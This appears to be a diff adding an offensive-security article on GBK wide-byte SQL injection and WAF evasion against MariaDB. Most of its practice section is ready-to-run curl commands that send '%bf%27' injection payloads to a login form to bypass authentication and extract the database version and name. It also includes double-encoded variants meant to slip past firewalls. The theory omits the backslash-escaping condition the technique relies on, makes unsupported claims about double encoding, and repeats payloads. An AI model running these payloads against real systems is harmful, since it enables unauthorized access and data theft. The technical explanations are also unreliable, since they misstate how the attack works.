@@ -1,0 +1,101 @@
+---
+title: 'Wide Byte Injection GBK: Bypass WAFs in MariaDB'
+description: Explore Wide Byte Injection using GBK encoding to exploit vulnerabilities
+  and bypass WAFs in MariaDB applications.
+keywords:
+- Wide Byte Injection
+- GBK encoding
+- MariaDB
+- WAF bypass
+- SQL injection
+- charset trick
+- double encoding
+---
+
+# Wide Byte Injection (GBK)
+
+## Context
+
+This article explains how to exploit Wide Byte Injection in MariaDB, using GBK encoding to bypass Web Application Firewalls (WAFs). The reader is assumed to have knowledge of character encoding, SQL query structures, web application firewalls, and MariaDB WAF bypass techniques.
+
+## Theory
+
+### GBK Character Encoding
+
+GBK is a character encoding specifically designed for Simplified Chinese. It is an extension of the basic GB2312 character set, enabling Chinese characters to be represented. Unlike single-byte character encodings typical in Western languages, GBK uses a variable-length encoding scheme, which allows for both single and double-byte characters. This dual nature can be leveraged in SQL injection attacks by introducing injected data that may alter SQL logic.
+
+### Wide Byte Injection Mechanism
+
+Wide Byte Injection leverages the misinterpretation of multi-byte characters by an application or database system. By injecting wide byte characters, an attacker can alter SQL query logic and bypass security mechanisms. The technique exploits vulnerabilities where applications or databases incorrectly interpret character lengths, potentially bypassing filters and protections meant to sanitize input.
+
+### Charset Trick Exploitation
+
+Charset trick exploitation involves manipulating the character encoding settings of an application or database. By doing so, attackers can introduce malicious input that remains undetected by common filtering mechanisms. This is particularly effective against WAFs that rely on specific character encodings to discern potential threats. Encoding discrepancies can be harnessed to bypass input validation controls.
+
+### Double Encoding Technique
+
+The Double Encoding technique encodes input data multiple times to evade detection by security tools. This method leverages the flawed handling of encoded inputs by applications or databases, allowing malicious payloads to pass through filters unhindered. By submitting double-encoded data, attackers can obscure the true nature of the input until it is executed by the target system.
+
+### 0xbf27 Bypass Methodology
+
+This bypass method exploits the GBK encoding of the 0xbf27 sequence. In GBK, 0xbf is recognized as a valid lead byte. Injecting the 0xbf27 sequence can effectively manipulate the SQL query execution. This technique is potent when seeking to introduce SQL logic that can alter the behavior of a database query to either extract sensitive information or bypass authentication mechanisms.
+
+## Practice
+
+### Wide Byte Injection using GBK Encoding
+
+- Use the following command to inject a wide byte character for SQL manipulation:
+  
+  ```bash
+  curl -X POST -d "username=admin&password=1234%bf%27 OR '1'='1" http://target.com/login
+  ```
+
+  This command injects a wide byte character and alters the SQL query logic, bypassing authentication.
+
+- To use the UNION SELECT method to extract database version information:
+  
+  ```bash
+  curl -X POST -d "username=admin&password=1234%bf%27 UNION SELECT null,version()-- " http://target.com/login
+  ```
+
+  This technique attempts to gather the database version by manipulating the SQL statement.
+
+### Double Encoding for WAF Evasion
+
+- For WAF evasion using double encoding, execute the following command:
+
+  ```bash
+  curl -X POST -d "username=admin&password=%25bf%2527 OR '1'='1" http://target.com/login
+  ```
+
+  This adds a layer of encoding to bypass firewall detection routines.
+
+- Use the following to double encode UNION SELECT payload:
+
+  ```bash
+  curl -X POST -d "username=admin&password=%25bf%2527 UNION SELECT null,@@version-- " http://target.com/login
+  ```
+
+  This approach aims to extract version details by fooling the WAF.
+
+### 0xbf27 Injection for SQL Manipulation
+
+- Inject 0xbf27 directly to manipulate SQL query execution:
+
+  ```bash
+  curl -X POST -d "username=admin&password=1234%bf%27 OR '1'='1" http://target.com/login
+  ```
+
+  This changes how the SQL query is handled to bypass the login process.
+
+- To extract the current database using 0xbf27 injection, use:
+
+  ```bash
+  curl -X POST -d "username=admin&password=1234%bf%27 UNION SELECT null,database()-- " http://target.com/login
+  ```
+
+  This attempts to display the current database name by altering the SQL logic.
+
+## Tools
+
+- **curl**
